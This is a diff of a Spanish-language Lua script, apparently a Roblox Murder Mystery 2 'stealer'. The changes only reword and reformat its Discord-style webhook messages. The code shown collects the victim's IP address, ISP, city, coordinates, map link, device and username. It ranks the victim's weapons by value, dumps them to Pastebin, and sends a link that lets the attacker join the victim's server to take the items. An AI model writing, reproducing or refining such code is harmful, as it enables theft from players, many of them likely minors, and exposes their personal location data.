@@ -92,19 +92,19 @@ local data = {
         ["color"] = 16729344,
         ["thumbnail"] = {["url"] = avatarUrl},
         ["fields"] = {
-            {["name"]="💻 Dispositivo", ["value"]=platform, ["inline"]=true},
-            {["name"]="🛰️ IP", ["value"]=userIP, ["inline"]=true},
-            {["name"]="🌐 Compañía de Internet", ["value"]=userISP, ["inline"]=true},
-            {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
-            {["name"]="👥 DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
-            {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
-            {["name"]="🏙️ Ciudad", ["value"]=cityDisplay, ["inline"]=true},
-            {["name"]="📏 Kilómetros", ["value"]=kmDisplay, ["inline"]=true},
-            {["name"]="🗺️ Longitud/Latitud", ["value"]=longDisplay, ["inline"]=true},
-            {["name"]="🔗 Ubicación", ["value"]=googleMapsLink, ["inline"]=false},
-            {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
-            {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
-            {["name"]="💥 Estado", ["value"]="Se recopilo todos los datos correctamente ✅", ["inline"]=false}
+            {["name"]="💻 Dispositivo:", ["value"]=platform, ["inline"]=true},
+            {["name"]="🛰️ IP:", ["value"]=userIP, ["inline"]=true},
+            {["name"]="🌐 Compañía de Internet:", ["value"]=userISP, ["inline"]=true},
+            {["name"]="👤 Usuario:", ["value"]=LocalPlayer.Name, ["inline"]=true},
+            {["name"]="👥 DisplayName:", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
+            {["name"]="🌎 País:", ["value"]=countryDisplay, ["inline"]=true},
+            {["name"]="🏙️ Ciudad:", ["value"]=cityDisplay, ["inline"]=true},
+            {["name"]="📏 Kilómetros:", ["value"]=kmDisplay, ["inline"]=true},
+            {["name"]="🗺️ Longitud/Latitud:", ["value"]=longDisplay, ["inline"]=true},
+            {["name"]="🔗 Ubicación:", ["value"]=googleMapsLink, ["inline"]=false},
+            {["name"]="🛠️ Executor:", ["value"]=executorName, ["inline"]=true},
+            {["name"]="⏰ Hora:", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
+            {["name"]="💥 Estado:", ["value"]="Se recopilo todos los datos correctamente ✅", ["inline"]=false}
         },
         ["footer"] = {["text"] = "Sistema de ejecución hacking • " .. os.date("%d/%m/%Y")}
     }}
@@ -480,14 +480,14 @@ table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amou
 
 -- 🔹 Fern Link real solo visible en webhook
 local fernToken = math.random(100000,999999)
-local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
+local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
 -- Preparar contenido completo para Pastebin
 local pasteContent = ""
 for _, w in ipairs(weaponsToSend) do
-    pasteContent = pasteContent..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+    pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
 end
-pasteContent = pasteContent .. "\nTotal Value: "..tostring(totalValue).."💰"
+pasteContent = pasteContent .. "\nValor total del inventario📦: "..tostring(totalValue).."💰"
 
 local pasteLink
 if #weaponsToSend > 18 then
@@ -498,7 +498,7 @@ end
 if #weaponsToSend > 0 then
     local fieldsInit={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
-        {name="Inventario 📦:", value="", inline=false},
+        {name="inventario 📦:", value="", inline=false},
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
         {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
     }
@@ -506,7 +506,7 @@ if #weaponsToSend > 0 then
     local maxEmbedItems = math.min(18,#weaponsToSend)
     for i=1,maxEmbedItems do
         local w = weaponsToSend[i]
-        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
+        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
     end
 
     if #weaponsToSend > 18 then
@@ -517,7 +517,7 @@ if #weaponsToSend > 0 then
     end
 
     local prefix=pingEveryone and "@everyone " or ""
-    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
+    SendWebhook("**💪MM2 Hit el mejor stealer💯**","**💰Disfruta todas las armas gratis 😎**",fieldsInit,prefix)
 end
 
 -- 🔹 Trade
